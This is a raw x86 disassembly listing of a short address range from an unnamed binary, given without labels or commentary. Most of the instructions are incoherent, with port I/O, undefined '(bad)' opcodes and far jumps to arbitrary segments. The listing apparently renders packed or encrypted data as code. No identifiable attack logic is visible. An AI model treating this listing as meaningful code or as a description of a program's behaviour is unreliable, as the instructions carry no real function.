  41a3ce:	cmp    cl,BYTE PTR [ecx]
  41a3d0:	addr16 xor eax,0x373e5d71
  41a3d6:	arpl   WORD PTR [edx-0x7b],cx
  41a3d9:	daa    
  41a3da:	ins    BYTE PTR es:[edi],dx
  41a3db:	push   ebp
  41a3dc:	pop    edi
  41a3dd:	push   ebp
  41a3de:	push   ecx
  41a3df:	xor    eax,0x2a633746
  41a3e4:	xor    DWORD PTR [eax],ebp
  41a3e6:	pop    edi
  41a3e7:	xor    eax,0x1a6e444c
  41a3ec:	xor    ecx,DWORD PTR [esi+ebp*2+0xa]
  41a3f0:	jl     0x41a3f7
  41a3f2:	add    BYTE PTR [edx],cl
  41a3f4:	xchg   ecx,eax
  41a3f5:	xor    dh,BYTE PTR [eax+0x15]
  41a3f8:	push   edx
  41a3f9:	cmc    
  41a3fa:	sub    eax,0x197b0d
  41a3ff:	sub    dh,BYTE PTR [ecx+0x32]
  41a402:	jo     0x41a401
	...
  41a410:	add    BYTE PTR [eax],al
  41a412:	add    BYTE PTR [ebp-0x78048fe5],ah
  41a418:	xor    DWORD PTR [ebx-0x36],esp
  41a41b:	je     0x41a45e
  41a41d:	pop    edi
  41a41e:	aad    0x41
  41a420:	add    eax,0x560e900
  41a425:	add    cl,ch
  41a427:	pusha  
  41a428:	add    eax,0x3fa0e900
  41a42d:	xor    eax,0xcd6fdcfd
  41a432:	fsubr  DWORD PTR [edi+0x2e]
  41a435:	add    BYTE PTR [ebx+0x17462260],al
  41a43b:	mov    eax,ds:0xfcdd353f
  41a440:	outs   dx,DWORD PTR ds:[esi]
  41a441:	int    0xf8
  41a443:	dec    edi
  41a444:	add    BYTE PTR cs:[ebx+0x60],al
  41a448:	and    al,BYTE PTR [esi+0x0]
  41a44b:	ins    BYTE PTR es:[edi],dx
  41a44c:	inc    esp
  41a44d:	dec    edx
  41a44e:	aaa    
  41a44f:	dec    BYTE PTR [edx+0x319bcfba]
  41a455:	jns    0x41a457
  41a457:	and    BYTE PTR [esi],al
  41a459:	gs inc esi
  41a45b:	mov    WORD PTR [esi-0x62750003],?
  41a461:	sub    eax,0x4f015232
  41a466:	outs   dx,DWORD PTR ds:[esi]
  41a467:	and    al,0xed
  41a469:	jb     0x41a4cc
  41a46b:	dec    eax
  41a46c:	fcomp  QWORD PTR [ebx+0x4d]
  41a46f:	adc    esp,edx
  41a471:	jno    0x41a4e2
  41a473:	cmp    esi,esp
  41a475:	gs je  0x41a478
	...
  41a484:	add    BYTE PTR [eax],al
  41a486:	pop    esi
  41a487:	call   0xf39918f9
  41a48c:	ins    DWORD PTR es:[edi],dx
  41a48d:	gs jbe 0x41a431
  41a490:	inc    edx
  41a491:	js     0x41a50d
  41a493:	in     eax,0x6a
  41a495:	jb     0x41a4fe
  41a497:	repz pop ebx
  41a499:	dec    ecx
  41a49a:	ins    BYTE PTR es:[edi],dx
  41a49b:	in     eax,dx
  41a49c:	pusha  
  41a49d:	ins    BYTE PTR es:[edi],dx
  41a49e:	outs   dx,BYTE PTR ds:[esi]
  41a49f:	or     BYTE PTR [esi+0x6f],al
  41a4a2:	cmp    ch,ah
  41a4a4:	outs   dx,BYTE PTR ds:[esi]
  41a4a5:	pop    esp
  41a4a6:	dec    ecx
  41a4a7:	in     eax,dx
  41a4a8:	push   0x72
  41a4aa:	sbb    ebx,edi
  41a4ac:	pusha  
  41a4ad:	xor    cl,BYTE PTR [edx]
  41a4af:	push   es
  41a4b0:	add    BYTE PTR [eax],al
  41a4b2:	or     ah,cl
  41a4b4:	jmp    DWORD PTR [ecx-0x6]
  41a4b7:	fdiv   st(7),st
  41a4b9:	xor    edx,edi
  41a4bb:	popf   
  41a4bc:	std    
  41a4bd:	xor    eax,0x65fd990a
  41a4c2:	or     ah,BYTE PTR [ebp-0x2005c703]
  41a4c8:	push   DWORD PTR [ebx]
  41a4ca:	cli    
  41a4cb:	scas   al,BYTE PTR es:[edi]
  41a4cc:	std    
  41a4cd:	sub    al,0xca
  41a4cf:	mov    cl,0xfd
  41a4d1:	bound  esp,QWORD PTR [ebx-0x64]
  41a4d4:	and    eax,0xe09c8a00
  41a4d9:	inc    DWORD PTR [ebx-0x64]
  41a4dc:	idiv   bh
  41a4de:	ja     0x41a47c
  41a4e0:	jmp    0x26de2ce4
  41a4e5:	add    BYTE PTR [ecx-0x64],dh
  41a4e8:	repz inc DWORD PTR [eax]
	...
  41a4f7:	add    BYTE PTR [eax],al
  41a4f9:	imul   ebx,DWORD PTR [ecx+esi*8+0x259c50ff],0x0
  41a501:	add    DWORD PTR [esp+0x279c5400],ebx
  41a508:	add    BYTE PTR [esp+ebx*4+0x1],cl
  41a50c:	add    BYTE PTR [esi],ch
  41a50e:	push   ebp
  41a50f:	and    eax,0x20ef0472
  41a514:	idiv   dx
  41a517:	pop    eax
  41a518:	addr16 cmc 
  41a51a:	hlt    
  41a51b:	and    DWORD PTR [ebx-0x29],esp
  41a51e:	out    0xdd,eax
  41a520:	(bad)  
  41a521:	mov    esi,0x7c3a340a
  41a526:	add    DWORD PTR [bx+di-0x4c],edx
  41a52a:	clc    
  41a52b:	aaa    
  41a52c:	jne    0x41a4f0
  41a52e:	lods   al,BYTE PTR ds:[esi]
  41a52f:	sub    BYTE PTR [edx+eiz*4-0x6],bl
  41a533:	and    BYTE PTR [edx-0x3a],ah
  41a536:	cli    
  41a537:	inc    esp
  41a538:	ins    DWORD PTR es:[edi],dx
  41a539:	mov    dh,0xd1
  41a53b:	and    ch,BYTE PTR [esi+0x63]
  41a53e:	imul   ebx,DWORD PTR [esp+esi*2],0x7e
  41a542:	imul   ebp,DWORD PTR [eax],0x72
  41a545:	xchg   ebp,eax
  41a546:	shl    DWORD PTR [ebx],0x71
  41a549:	arpl   WORD PTR [ebx-0x74798be4],cx
  41a54f:	sub    BYTE PTR [edx+0x6d],dh
  41a552:	mov    ecx,0xc2462033
  41a557:	dec    ebp
  41a558:	dec    eax
  41a559:	je     0x41a560
  41a55b:	call   0x0:0x37
	...
  41a56a:	add    BYTE PTR [eax],al
  41a56c:	arpl   WORD PTR [eax+edx*4+0x37],dx
  41a570:	inc    eax
  41a571:	push   esp
  41a572:	mov    WORD PTR ds:0xe3992255,?
  41a578:	and    DWORD PTR [ecx],0x23405aa3
  41a57e:	xchg   esp,eax
  41a57f:	xor    eax,0x1c9a0547
  41a584:	aaa    
  41a585:	and    bl,BYTE PTR [edx+0x4c2f3128]
  41a58b:	ss inc ebx
  41a58d:	loop   0x41a5d1
  41a58f:	push   eax
  41a590:	xor    DWORD PTR [edx],esp
  41a592:	inc    esp
  41a593:	and    DWORD PTR [edi],edx
  41a595:	and    al,BYTE PTR [edi]
  41a597:	dec    eax
  41a598:	cld    
  41a599:	xor    cl,BYTE PTR [ebp+eiz*1-0x9]
  41a59d:	pop    ss
  41a59e:	cmp    DWORD PTR [ebx],ebp
  41a5a0:	arpl   WORD PTR [eax+eax*2+0x38],dx
  41a5a4:	add    BYTE PTR [esp+eax*2+0x36],dl
  41a5a8:	in     eax,dx
  41a5a9:	and    DWORD PTR [ecx],ebx
  41a5ab:	in     al,0x81
  41a5ad:	and    esp,ecx
  41a5af:	push   esi
  41a5b0:	shl    BYTE PTR [edx],cl
  41a5b2:	sbb    DWORD PTR [edx+esi*4],eax
  41a5b5:	push   ds
  41a5b6:	adc    esp,DWORD PTR [edi]
  41a5b8:	mov    dl,0x22
  41a5ba:	stc    
  41a5bb:	cmp    eax,eax
  41a5bd:	xor    eax,edi
  41a5bf:	out    0xc0,al
  41a5c1:	ficomp DWORD PTR [ebx]
  41a5c3:	xor    eax,0x53c733c0
  41a5c8:	mov    es,WORD PTR ds:0x3cbf350c
  41a5ce:	les    ebp,FWORD PTR [edx]
	...
  41a5dc:	add    BYTE PTR [eax],al
  41a5de:	add    BYTE PTR [edx+0x7d1ac81d],al
  41a5e4:	add    eax,0x228f1aba
  41a5e9:	call   0x4335:0xc42f7126
  41a5f0:	loop   0x41a5f1
  41a5f2:	int3   
  41a5f3:	pushf  
  41a5f4:	push   esi
  41a5f5:	inc    esi
  41a5f6:	xchg   ebp,eax
  41a5f7:	nop
  41a5f8:	add    eax,0x347c8c44
  41a5fd:	js     0x41a583
  41a5ff:	sub    dl,BYTE PTR [ecx+0x50]
  41a602:	jmp    0x84b5c69e
  41a607:	(bad)  
  41a608:	xlat   BYTE PTR ds:[ebx]
  41a609:	ja     0x41a59f
  41a60b:	pop    esp
  41a60c:	add    eax,0xe57e8455
  41a611:	inc    ebx
  41a612:	mov    BYTE PTR [eax+ecx*2+0x0],dh
  41a616:	popf   
  41a617:	and    DWORD PTR [edx],0x67
  41a61a:	push   edi
  41a61b:	xchg   DWORD PTR [ebx+0x5f],eax
  41a61e:	push   ebp
  41a61f:	inc    eax
  41a620:	add    eax,0x20233851
  41a625:	je     0x41a66b
  41a627:	jg     0x41a64a
  41a629:	ins    DWORD PTR es:[edi],dx
  41a62a:	cmp    ebx,DWORD PTR [eax+ecx*2+0x74]
  41a62e:	or     DWORD PTR [esi-0x59],ebp
  41a631:	jno    0x41a67b
  41a633:	inc    ebp
  41a634:	sbb    DWORD PTR [ebx-0x17],esp
  41a637:	mov    BYTE PTR [edi-0x58bf16d8],ah
  41a63d:	inc    edx
  41a63e:	mov    eax,cs:0x3b5454
	...
  41a650:	add    BYTE PTR [eax],al
  41a652:	mov    al,ds:0x5f354e3e
  41a657:	push   ebp
  41a658:	push   edx
  41a659:	xor    BYTE PTR [esi+eiz*8+0x51],bh
  41a65d:	and    BYTE PTR [edi+0x52],bl
  41a660:	dec    esi
  41a661:	and    BYTE PTR [eax-0x6016bcae],dl
  41a667:	cmp    eax,0x55faa43
  41a66c:	inc    esi
  41a66d:	scas   al,BYTE PTR es:[edi]
  41a66e:	scas   al,BYTE PTR es:[edi]
  41a66f:	inc    edx
  41a670:	inc    edi
  41a671:	scas   al,BYTE PTR es:[edi]
  41a672:	mov    ds:0x43bd0005,al
  41a677:	and    BYTE PTR [edi+0x0],ah
  41a67a:	adc    al,0xf2
  41a67c:	jmp    FWORD PTR [esi-0x48]
  41a67f:	or     esp,DWORD PTR [ebx+0x69]
  41a682:	and    al,0x56
  41a684:	jno    0x41a6f8
  41a686:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a687:	add    dh,BYTE PTR [eax+0x61]
  41a68a:	stc    
  41a68b:	icebp  
  41a68c:	jb     0x41a6fd
  41a68e:	clc    
  41a68f:	ficomp WORD PTR [edx+0x76]
  41a692:	fild   DWORD PTR [esi]
  41a694:	jno    0x41a6fb
  41a696:	mov    edx,0x38656eef
  41a69b:	in     al,0x5c
  41a69d:	ins    DWORD PTR es:[edi],dx
  41a69e:	fist   WORD PTR [ebp+0x76]
  41a6a1:	popa   
  41a6a2:	out    0xef,al
  41a6a4:	pusha  
  41a6a5:	add    ah,bl
  41a6a7:	out    dx,al
  41a6a8:	outs   dx,DWORD PTR ds:[esi]
  41a6a9:	cmp    dh,BYTE PTR [ebp-0x3a]
  41a6ac:	std    
  41a6ad:	addr16 cs in eax,dx
  41a6b0:	outs   dx,DWORD PTR ds:[esi]
  41a6b1:	cmp    ah,BYTE PTR [ebp-0x3a]
  41a6b4:	std    
  41a6b5:	add    BYTE PTR [bx+si],al
	...
  41a6c4:	add    BYTE PTR [esi],ch
  41a6c6:	in     eax,dx
  41a6c7:	outs   dx,DWORD PTR ds:[esi]
  41a6c8:	jae    0x41a72a
  41a6ca:	(bad)  
  41a6cb:	sub    al,0x0
  41a6cd:	push   esi
  41a6ce:	imul   ebp,DWORD PTR ds:[edi+0x1d],0xffffffe5
  41a6d3:	pusha  
  41a6d4:	pop    esp
  41a6d5:	cmp    DWORD PTR [ecx],ecx
  41a6d7:	jb     0x41a748
  41a6d9:	ja     0x41a6b7
  41a6db:	call   FWORD PTR [ebx-0x77]
  41a6de:	or     DWORD PTR [edx+0x6f],esi
  41a6e1:	or     BYTE PTR [bx+di+0x6d],dh
  41a6e5:	cmp    dh,BYTE PTR [esi]
  41a6e7:	aas    
  41a6e8:	push   0x65690738
  41a6ed:	pop    edx
  41a6ee:	in     eax,0x70
  41a6f0:	jae    0x41a72c
  41a6f2:	push   ebx
  41a6f3:	imul   esp,DWORD PTR [esi+0x2e],0xffffffef
  41a6f7:	pop    esp
  41a6f8:	jb     0x41a729
  41a6fa:	ss aas 
  41a6fc:	push   0x65690738
  41a701:	arpl   WORD PTR [ebp+ebx*1+0x73],bp
  41a705:	nop
  41a706:	pushf  
  41a707:	cmp    al,0x6e
  41a709:	jo     0x41a773
  41a70b:	and    al,0x6c
  41a70d:	xchg   DWORD PTR [edi-0x638e98bb],eax
  41a713:	dec    ebp
  41a714:	inc    edx
  41a715:	jno    0x41a77e
  41a717:	and    BYTE PTR [edi+0x56],ah
  41a71a:	xchg   ecx,eax
  41a71b:	add    DWORD PTR [ebp+eiz*1-0x6b],ebx
  41a71f:	and    ch,BYTE PTR [eax+0x51]
  41a722:	jg     0x41a744
  41a724:	arpl   WORD PTR [ebx+0x58],sp
  41a727:	inc    edx
  41a728:	ins    DWORD PTR es:[edi],dx
	...
  41a735:	add    BYTE PTR [eax],al
  41a737:	add    BYTE PTR [esi-0x71],cl
  41a73a:	and    eax,0x4f88636d
  41a73f:	ins    DWORD PTR es:[edi],dx
  41a740:	inc    eax
  41a741:	add    DWORD PTR [eax+0x63],0x37
  41a745:	xor    BYTE PTR [ecx],al
  41a747:	dec    ecx
  41a748:	dec    esi
  41a749:	icebp  
  41a74a:	es ins BYTE PTR es:[edi],dx
  41a74c:	(bad)  
  41a74d:	ss push ds
  41a74f:	add    BYTE PTR [edi],ch
  41a751:	jecxz  0x41a731
  41a753:	dec    edx
  41a754:	(bad)  
  41a755:	out    0x26,eax
  41a757:	ins    DWORD PTR es:[edi],dx
  41a758:	or     eax,0xf1504d9c
  41a75d:	ss es addr16 (bad) 
  41a761:	cmp    BYTE PTR [ecx],dh
  41a763:	add    BYTE PTR [esi],bl
  41a765:	in     al,dx
  41a766:	sbb    ah,BYTE PTR [ecx+0x63]
  41a769:	dec    edx
  41a76a:	inc    edi
  41a76b:	jo     0x41a737
  41a76d:	(bad)  
  41a76f:	inc    ebx
  41a770:	rol    DWORD PTR ds:0xfab00021,cl
  41a776:	and    ah,BYTE PTR [esi-0x3b]
  41a779:	mov    ecx,0xae935443
  41a77e:	xor    ah,BYTE PTR [edi-0x49]
  41a781:	adc    DWORD PTR [ecx],esi
  41a783:	cs mov edx,0xbf001ca4
  41a789:	add    eax,0x2a8f1cba
  41a78e:	fiadd  DWORD PTR [ebx]
  41a790:	scas   eax,DWORD PTR es:[edi]
  41a791:	cmp    eax,eax
  41a793:	xor    bh,BYTE PTR [eax+ebp*1-0x42]
  41a797:	and    BYTE PTR [ebx+0x52],al
  41a79a:	int3   
  41a79b:	daa    
	...
  41a7a8:	add    BYTE PTR [eax],al
  41a7aa:	add    BYTE PTR [esi+eiz*1-0x19],bh
  41a7ae:	fld    QWORD PTR [esi-0x6dfc48e7]
  41a7b4:	add    eax,0x55703c4
  41a7b9:	fwait
  41a7ba:	add    edi,DWORD PTR [eax*1+0x546038d]
  41a7c1:	call   0x4f46:0xab056303
  41a7c8:	xor    al,0x89
  41a7ca:	and    al,0x47
  41a7cc:	in     eax,0xa2
  41a7ce:	push   ds
  41a7cf:	xor    eax,DWORD PTR ss:[ebx-0x7bd6fbe2]
  41a7d6:	xor    DWORD PTR [ebx+0x38],esp
  41a7d9:	xor    al,0xde
  41a7db:	xor    eax,0x631c4a17
  41a7e0:	dec    ebx
  41a7e1:	pop    ecx
  41a7e2:	daa    
  41a7e3:	adc    ch,BYTE PTR ds:0x5135825
  41a7e9:	adc    eax,0xe74b2851
  41a7ee:	inc    ecx
  41a7ef:	jmp    DWORD PTR ds:0x191d2731
  41a7f5:	aaa    
  41a7f6:	add    al,0xd2
  41a7f8:	sbb    esp,DWORD PTR cs:[edi]
  41a7fb:	test   DWORD PTR [ecx],ebp
  41a7fd:	or     BYTE PTR [eax],bh
  41a7ff:	arpl   WORD PTR [ecx+0x8],dx
  41a802:	xor    edi,ecx
  41a804:	xor    eax,0x1cb23108
  41a809:	push   ss
  41a80a:	xor    bh,BYTE PTR [edi+0x232b05]
	...
  41a81c:	add    BYTE PTR [eax],al
  41a81e:	mov    dl,0x19
  41a820:	add    BYTE PTR [eax],ch
  41a822:	jnp    0x41a84d
  41a824:	jb     0x41a82a
  41a826:	push   edx
  41a827:	push   ss
  41a828:	add    BYTE PTR [ebp-0x4b8be9bf],dh
  41a82e:	push   ebx
  41a82f:	sub    BYTE PTR [edx-0x17],dh
  41a832:	inc    esp
  41a833:	inc    esp
  41a834:	jno    0x41a80b
  41a836:	nop
  41a837:	xor    dh,BYTE PTR [edx-0x43]
  41a83a:	pusha  
  41a83b:	ss ins DWORD PTR es:[edi],dx
  41a83d:	(bad)  
  41a83e:	xor    al,0x1a
  41a840:	pop    edi
  41a841:	mov    ebx,0xbd46413d
  41a846:	adc    DWORD PTR [esi],0x447db968
  41a84c:	imul   edi,DWORD PTR [ebp-0x6ca0cede],0x99744b7d
  41a856:	sub    al,0x36
  41a858:	arpl   WORD PTR [ebp+0x6c],di
  41a85b:	sub    al,0x6e
  41a85d:	xchg   BYTE PTR [ebx+0x5],dh
  41a860:	pop    esp
  41a861:	stos   DWORD PTR es:[edi],eax
  41a862:	inc    esp
  41a863:	inc    esp
  41a864:	jp     0x41a7ea
  41a866:	sbb    DWORD PTR es:[eax-0x17],esi
  41a86a:	mov    dh,0x29
  41a86c:	jo     0x41a8bb
  41a86e:	addr16 dec ebx
  41a870:	push   esp
  41a871:	cmp    DWORD PTR [edx+0x581d2dec],ebp
  41a877:	xor    ebp,DWORD PTR [ecx+0x25]
  41a87a:	xor    ch,BYTE PTR ds:0x41434d63
  41a880:	ins    DWORD PTR es:[edi],dx
  41a881:	cmp    DWORD PTR [eax],eax
	...
  41a88f:	add    BYTE PTR [eax],al
  41a891:	cmp    al,0x33
  41a893:	pop    esp
  41a894:	dec    edx
  41a895:	jle    0x41a8c5
  41a897:	imul   ecx,DWORD PTR [eax],0x75
  41a89a:	sub    DWORD PTR [eax],eax
  41a89c:	outs   dx,BYTE PTR es:[esi]
  41a89e:	dec    ebx
  41a89f:	push   esp
  41a8a0:	cmp    DWORD PTR [edi+0x44],ebx
  41a8a3:	ins    DWORD PTR es:[edi],dx
  41a8a4:	call   FWORD PTR [esi+0x26]
  41a8a7:	popa   
  41a8a8:	add    BYTE PTR [esi],dh
  41a8aa:	add    BYTE PTR [ebx+0x6e],ch
  41a8ad:	sub    ecx,eax
  41a8af:	jno    0x41a929
  41a8b1:	es pop es
  41a8b3:	das    
  41a8b4:	inc    esp
  41a8b5:	fisttp WORD PTR [eax+0x54]
  41a8b8:	push   eax
  41a8b9:	or     dl,dh
  41a8bb:	fs je  0x41a8e5
  41a8be:	(bad)  
  41a8bf:	sub    eax,0x1c69
  41a8c4:	pop    esp
  41a8c5:	pop    ecx
  41a8c6:	dec    ebp
  41a8c7:	sub    DWORD PTR [esi-0x2a],eax
  41a8ca:	add    BYTE PTR ss:[ecx+ecx*8-0x1],bl
  41a8cf:	jae    0x41a936
  41a8d1:	mov    dh,0xeb
  41a8d3:	outs   dx,BYTE PTR ds:[esi]
  41a8d4:	imul   esp,DWORD PTR [ebp-0x358d9f00],0x16464b35
  41a8de:	cmp    bh,BYTE PTR ds:0x3f52f752
  41a8e4:	ins    BYTE PTR es:[edi],dx
  41a8e5:	jmp    0x41a8bc
  41a8e7:	outs   dx,BYTE PTR ds:[esi]
  41a8e8:	cmp    DWORD PTR gs:[edx+0x54],edx
  41a8ec:	jns    0x41a918
  41a8ee:	jmp    0x41a93b
  41a8f0:	imul   ebx,eax,0x467752
	...
  41a902:	add    BYTE PTR [eax],al
  41a904:	rcl    DWORD PTR [esi-0x4eb6cccf],cl
  41a90a:	xor    eax,0x4397442d
  41a90f:	xor    bl,BYTE PTR [edi-0x68]
  41a912:	sub    eax,0x3ebc4b31
  41a917:	xor    ecx,DWORD PTR [ecx-0x50]
  41a91a:	sub    dh,BYTE PTR [eax]
  41a91c:	bound  ebx,QWORD PTR [ecx-0x64c7cdd3]
  41a922:	inc    ebx
  41a923:	xor    al,0x53
  41a925:	inc    esp
  41a926:	inc    edx
  41a927:	jge    0x41a8c7
  41a929:	cwde   
  41a92a:	sub    esi,DWORD PTR [edx]
  41a92c:	mov    ds,WORD PTR [ecx+0x5637759]
  41a932:	sbb    dh,BYTE PTR [ecx]
  41a934:	jno    0x41a8e2
  41a936:	inc    eax
  41a937:	pop    edi
  41a938:	mov    al,0x5
  41a93a:	inc    edx
  41a93b:	push   esp
  41a93c:	xchg   ebx,eax
  41a93d:	lods   al,BYTE PTR ds:[esi]
  41a93e:	inc    ebp
  41a93f:	dec    esi
  41a940:	mov    esi,0x915f56a0
  41a945:	or     eax,0xfa63651a
  41a94a:	sub    esp,DWORD PTR [esi-0x6d]
  41a94d:	lods   al,BYTE PTR ds:[esi]
  41a94e:	xlat   BYTE PTR ds:[ebx]
  41a94f:	jno    0x41a9d0
  41a951:	mov    esp,0x5ea65401
  41a956:	cmp    BYTE PTR [ecx-0x6f],dl
  41a959:	sbb    dl,0x29
  41a95c:	arpl   WORD PTR [esp+0x71],bx
  41a960:	jo     0x41a9c5
  41a962:	sbb    dh,BYTE PTR [edx+0x47]
  41a965:	or     al,0xef
  41a967:	add    BYTE PTR cs:[eax],al
	...
  41a976:	add    BYTE PTR [ecx+0x57ffeb8e],bl
  41a97c:	jg     0x41a99e
  41a97e:	jb     0x41a9b5
  41a980:	lea    ebx,[eax]
  41a982:	arpl   WORD PTR [ecx+0x7f],di
  41a985:	jmp    0x41a986
  41a987:	and    DWORD PTR ds:0x1d8d836c,edx
  41a98e:	xor    DWORD PTR fs:[ecx+0x1f597136],edx
  41a995:	jmp    0x41a996
  41a997:	inc    esi
  41a998:	lods   al,BYTE PTR ds:[esi]
  41a999:	dec    ebp
  41a99a:	inc    ebx
  41a99b:	xor    ecx,esi
  41a99d:	push   esp
  41a99e:	push   edx
  41a99f:	sub    eax,0x1746040b
  41a9a4:	fsubr  st(3),st
  41a9a6:	dec    ebp
  41a9a7:	add    al,0xe3
  41a9a9:	add    eax,DWORD PTR [esi+0x17]
  41a9ac:	cld    
  41a9ad:	cmp    DWORD PTR [ebp-0x14],ebp
  41a9b0:	stos   DWORD PTR es:[edi],eax
  41a9b1:	xlat   BYTE PTR ss:[bx]
  41a9b4:	dec    ecx
  41a9b5:	xor    eax,0x1405db2e
  41a9ba:	sbb    BYTE PTR [ebx+0x34],ah
  41a9bd:	cs inc edx
  41a9bf:	scas   eax,DWORD PTR es:[edi]
  41a9c0:	cmp    BYTE PTR [eax],ch
  41a9c2:	push   esi
  41a9c3:	mov    al,ds:0xc11b3941
  41a9c8:	xor    ah,dl
  41a9ca:	inc    ecx
  41a9cb:	xchg   edi,eax
  41a9cc:	xor    eax,0xd876f6c7
  41a9d1:	adc    dl,BYTE PTR [edi-0x7e]
  41a9d4:	adc    eax,DWORD PTR [eax]
  41a9d6:	xor    al,0x8f
  41a9d8:	adc    al,0xe7
  41a9da:	push   esi
	...
  41a9e7:	add    BYTE PTR [eax],al
  41a9e9:	add    BYTE PTR [esi+0x4452b347],bl
  41a9ef:	xor    ebp,DWORD PTR [edi+eax*2+0x1ac93091]
  41a9f6:	dec    eax
  41a9f7:	inc    edi
  41a9f8:	fwait
  41a9f9:	push   ebx
  41a9fa:	inc    ebx
  41a9fb:	aam    0xc
  41a9fd:	xrelease mov BYTE PTR [edi-0x65],al
  41aa01:	push   ebx
  41aa02:	xor    ch,BYTE PTR [edx]
  41aa04:	mov    ecx,0x9a134031
  41aa09:	add    esp,DWORD PTR ds:0x23e3b739
  41aa0f:	xor    BYTE PTR [ecx+ebx*1+0x4fa50537],bl
  41aa16:	adc    esp,ebp
  41aa18:	lods   al,BYTE PTR ds:[esi]
  41aa19:	sbb    al,0x3f
  41aa1b:	sub    al,ah
  41aa1d:	pop    ds
  41aa1e:	arpl   WORD PTR ds:0x18123688,si
  41aa24:	jle    0x41aa5b
  41aa26:	inc    DWORD PTR [edx+edi*1]
  41aa29:	pop    ds
  41aa2a:	adc    DWORD PTR [edi],edx
  41aa2c:	inc    esp
  41aa2d:	ss adc eax,0x631f4426
  41aa33:	cmp    bl,BYTE PTR [edx+0x1f]
  41aa36:	icebp  
  41aa37:	dec    ebp
  41aa38:	sub    eax,DWORD PTR [esp]
  41aa3b:	das    
  41aa3c:	push   eax
  41aa3d:	xor    ah,bh
  41aa3f:	and    eax,0x28a34500
  41aa44:	jb     0x41aa8a
  41aa46:	jle    0x41aa61
  41aa48:	ins    DWORD PTR es:[edi],dx
  41aa49:	sbb    edi,DWORD PTR [eax+0x5]
  41aa4c:	push   eax
  41aa4d:	push   cs
	...
  41aa5a:	add    BYTE PTR [eax],al
  41aa5c:	add    BYTE PTR [ebp+0x541c4e19],cl
  41aa62:	and    esp,DWORD PTR [ebx+0x1b]
  41aa65:	pop    edi
  41aa66:	ss arpl bx,di
  41aa69:	jb     0x41aa8f
  41aa6b:	jb     0x41aa82
  41aa6d:	js     0x41aa84
  41aa6f:	arpl   cx,bp
  41aa71:	jo     0x41aa78
  41aa73:	add    cl,ch
  41aa75:	test   eax,0x6ee93f4a
  41aa7a:	and    al,0x8f
  41aa7c:	fsubr  st(1),st
  41aa7e:	dec    ecx
  41aa7f:	dec    esp
  41aa80:	push   es
  41aa81:	jno    0x41aa3b
  41aa83:	add    eax,0xd1a3c789
  41aa88:	iret   
  41aa89:	xor    eax,0xafb0038
  41aa8e:	shr    DWORD PTR ds:0x30f1c9fb,cl
  41aa94:	mul    BYTE PTR [eax-0x2b]
  41aa97:	or     edi,ebp
  41aa99:	enter  0x5ec,0xe8
  41aa9d:	lds    eax,FWORD PTR [edx]
  41aa9f:	add    eax,0x510567ea
  41aaa4:	jle    0x41aa28
  41aaa6:	sbb    DWORD PTR [ebp-0x78],esi
  41aaa9:	jbe    0x41aacf
  41aaab:	pop    esp
  41aaac:	lods   eax,DWORD PTR ds:[esi]
  41aaad:	dec    ecx
  41aaae:	das    
  41aaaf:	pop    edi
  41aab0:	jp     0x41aad4
  41aab2:	cmp    DWORD PTR [eax-0x73],edx
  41aab5:	das    
  41aab6:	sub    BYTE PTR [esp+ecx*2-0x79],dh
  41aaba:	dec    edx
  41aabb:	pop    edi
  41aabc:	dec    edi
  41aabd:	inc    eax
  41aabe:	sub    ah,BYTE PTR [ebx+0x5b]
	...
  41aacd:	add    BYTE PTR [eax],al
  41aacf:	add    BYTE PTR [edi+0x4d],ah
  41aad2:	ins    DWORD PTR es:[edi],dx
  41aad3:	pop    edx
  41aad4:	xor    eax,DWORD PTR ds:0x290053
  41aada:	jb     0x41aadc
  41aadc:	dec    edx
  41aadd:	in     al,0x6e
  41aadf:	jae    0x41ab2b
  41aae1:	xor    ebp,DWORD PTR [ebx+0x72]
  41aae4:	mov    cs,WORD PTR [ecx]
  41aae6:	push   edx
  41aae7:	gs ja  0x41aae6
  41aaea:	jae    0x41ab51
  41aaec:	sbb    bl,bh
  41aaee:	fs jb  0x41ab3b
  41aaf1:	inc    edi
  41aaf2:	aas    
  41aaf3:	jns    0x41ab5d
  41aaf5:	(bad)  
  41aaf6:	jno    0x41ab5c
  41aaf8:	das    
  41aaf9:	jmp    0x6370:0xff140066
  41ab00:	popa   
  41ab01:	or     DWORD PTR [ecx+0x73],esi
  41ab04:	pop    edi
  41ab05:	xlat   BYTE PTR ds:[ebx]
  41ab06:	sub    eax,0x65fd3563
  41ab0b:	imul   ebx,DWORD PTR ds:0x2f733c03,0xb46973ef
  41ab15:	in     eax,0x1f
  41ab17:	outs   dx,BYTE PTR ds:[esi]
  41ab18:	sbb    edi,eax
  41ab1a:	pusha  
  41ab1b:	cmp    eax,0x220958
  41ab20:	sbb    al,0xe4
  41ab22:	imul   esi,DWORD PTR [ebp-0x61],0xffffffa7
  41ab26:	pop    ds
  41ab27:	add    BYTE PTR [ecx],cl
  41ab29:	(bad)  
  41ab2a:	gs je  0x41ab1a
  41ab2d:	jecxz  0x41aba0
  41ab2f:	idiv   BYTE PTR gs:[ecx]
  41ab32:	gs ins DWORD PTR es:[edi],dx
	...
  41ab40:	add    BYTE PTR [eax],al
  41ab42:	add    BYTE PTR ds:0x2e6153fc,dh
  41ab48:	cli    
  41ab49:	pop    esp
  41ab4a:	ins    DWORD PTR es:[edi],dx
  41ab4b:	(bad)  
  41ab4c:	xor    dh,BYTE PTR [ecx+0x54]
  41ab4f:	dec    BYTE PTR [ebx+0x5c]
  41ab52:	push   ebx
  41ab53:	(bad)  
  41ab55:	outs   dx,BYTE PTR ds:[esi]
  41ab56:	imul   esi,DWORD PTR ds:0x52006ef7,0x63746ef6
  41ab60:	out    0x22,al
  41ab62:	imul   edi,esi,0xffffffab
  41ab65:	push   eax
  41ab66:	jno    0x41ab6e
  41ab68:	fidiv  DWORD PTR ds:0x448f65f
  41ab6e:	push   eax
  41ab6f:	ret    0x30db
  41ab72:	jne    0x41ab38
  41ab74:	ficomp DWORD PTR [edi]
  41ab76:	add    BYTE PTR [ebx-0x6a8bce09],dh
  41ab7c:	stc    
  41ab7d:	push   ss
  41ab7e:	(bad)  
  41ab7f:	(bad)  
  41ab80:	cli    
  41ab81:	add    edx,DWORD PTR [esi+edi*4-0x6]
  41ab85:	push   ss
  41ab86:	addr16 mov ebp,0xaa54180d
  41ab8c:	pushf  
  41ab8d:	and    BYTE PTR [eax],al
  41ab8f:	lods   eax,DWORD PTR ds:[esi]
  41ab90:	pushf  
  41ab91:	xor    DWORD PTR [esi-0x51],eax
  41ab94:	cld    
  41ab95:	aad    0x77
